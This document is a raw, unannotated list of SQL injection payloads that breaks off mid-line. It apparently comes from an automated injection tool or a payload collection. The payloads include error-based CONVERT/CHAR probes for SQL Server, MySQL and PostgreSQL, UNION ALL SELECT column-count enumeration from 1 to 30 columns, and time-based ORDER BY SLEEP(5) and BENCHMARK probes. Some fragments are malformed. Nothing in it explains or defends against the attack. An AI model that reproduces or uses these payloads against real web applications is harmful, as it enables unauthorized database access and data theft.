SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- UNION ALL SELECT NULL# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))# AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))# UNION ALL SELECT NULL AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107))) AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))) AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- UNION ALL SELECT 'INJ'||'ECT'||'XXX' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 'INJ'||'ECT'||'XXX'# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nORDER BY SLEEP(5) ORDER BY 1,SLEEP(5) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')) ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 ORDER BY SLEEP(5)# ORDER BY 1,SLEEP(5)# ORDER BY 1,SLEEP(5),3# ORDER BY 1,SLEEP(5),3,4# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29# ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30# ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 